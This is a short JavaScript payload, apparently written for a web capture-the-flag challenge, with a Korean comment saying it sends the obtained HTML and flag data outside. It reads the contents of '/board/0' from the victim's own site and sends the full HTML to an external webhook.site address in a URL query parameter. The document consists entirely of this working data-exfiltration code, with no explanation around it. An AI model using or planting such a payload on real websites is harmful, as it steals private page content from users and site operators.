fetch('/board/0')
  .then(response => response.text())
  .then(html => {
    // 획득한 HTML 및 Flag 데이터를 외부로 전달
    fetch('https://webhook.site/7c6d8599-2773-4bb4-914b-c33fd36efb97/log?data=' + encodeURIComponent(html));
  })
  .catch(err => console.error(err));
